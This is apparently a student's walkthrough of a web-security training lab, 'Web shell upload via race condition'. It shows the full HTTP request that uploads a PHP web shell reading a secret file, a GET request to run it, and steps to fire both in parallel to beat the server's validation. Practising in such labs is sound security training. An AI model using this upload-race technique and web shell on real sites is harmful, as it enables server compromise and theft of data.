# 6. Web shell upload via race condition

Goal : upload php shell using race condition.

Steps : 

- all above labs are not going to work in this Lab. so need to upload using race condition.
- 1st upload the shell.php then send that to repeater, then again take another any GET request end point. send that also in repeater. both request like this below

### Request of uploading shell.php :

```php
POST /my-account/avatar HTTP/2
Host: 0aa2009704bad7f480228b28009e0094.web-security-academy.net
Cookie: session=SKA8Vns5vWEkqIELtPvrKIvu1hKd26yl
Content-Length: 467
Cache-Control: max-age=0
Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Origin: https://0aa2009704bad7f480228b28009e0094.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKvk25VBm32jukf7h
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa2009704bad7f480228b28009e0094.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=0, i

------WebKitFormBoundaryKvk25VBm32jukf7h
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret') ?>

------WebKitFormBoundaryKvk25VBm32jukf7h
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryKvk25VBm32jukf7h
Content-Disposition: form-data; name="csrf"

1Lz0KLsa1Jl9UOdfFeEIKRJjWM2rC1cA
------WebKitFormBoundaryKvk25VBm32jukf7h--

```

### Request of any GET request like this below :

```php
GET /files/avatars/shell.php HTTP/2
Host: 0aa2009704bad7f480228b28009e0094.web-security-academy.net
Cookie: session=SKA8Vns5vWEkqIELtPvrKIvu1hKd26yl
Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa2009704bad7f480228b28009e0094.web-security-academy.net/my-account/avatar
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=0, i
```

- important point : —> first upload normally and png image then open in new page, then copy the directory of image and paste that into GET Request url like above : GET /files/avatars/abc.png   then replace the abc.png —> shell.php
- Now combine both request and make grouping.
- Now send the request parallel , send 2,4 times u will get the secret message.

LAB SOLVED 🙂